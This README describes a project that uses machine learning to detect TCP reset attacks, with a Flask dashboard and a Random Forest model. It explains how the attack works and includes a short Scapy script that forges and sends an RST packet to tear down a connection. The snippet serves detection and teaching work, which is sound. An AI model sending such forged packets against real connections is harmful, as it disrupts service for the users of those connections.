# 🚀 TCP Reset Attack Detection using Machine Learning (Flask + Random Forest)

This project demonstrates how TCP Reset (RST) attacks work and how Machine Learning can detect such malicious network flows.  
It includes:

- A **Flask-based web dashboard**  
- **Single-flow** and **batch-flow prediction**  
- A trained **Random Forest model**  
- Dynamic CSV column mapping  
- Realistic attack simulation with **Scapy**  
- Clean UI to preview results

---

## 📌 What is a TCP Reset Attack?

A **TCP Reset Attack** is a network attack where an attacker forges a TCP packet with:

- Correct source/destination IP  
- Correct ports  
- Correct sequence number  
- `RST` flag set  

When the victim receives this forged packet, the TCP connection is **forcefully terminated**.

This attack is commonly used for:

- Breaking active connections  
- Interrupting downloads  
- Denying service to users  
- Traffic manipulation  

---

## 📌 Demo of TCP RST Attack (using Scapy)

A simple Scapy attack script:

```python
from scapy.all import *

victim_ip = "192.168.1.10"
server_ip = "192.168.1.20"
victim_port = 50052
server_port = 80
seq_num = 12345

packet = IP(src=victim_ip, dst=server_ip) / \
         TCP(sport=victim_port, dport=server_port, flags="R", seq=seq_num)

send(packet)


## Project Structute
TCP_Reset_Attack/
│
├── app.py                        → Flask Web App
├── uploads/                      → Temporary uploaded CSV files
├── models/
│     └── rst_model.pkl           → Trained Random Forest model
├── ml/
│     ├── predict_attack.py       → Prediction pipeline
│     ├── preprocess.py           → Data cleaning utilities
│     ├── train_model.py          → Training script
│     ├── evaluate.py             → Metrics and evaluation
│     └── visualize.py            → Graphs / Plots
└── templates/
      └── index.html              → Dashboard UI
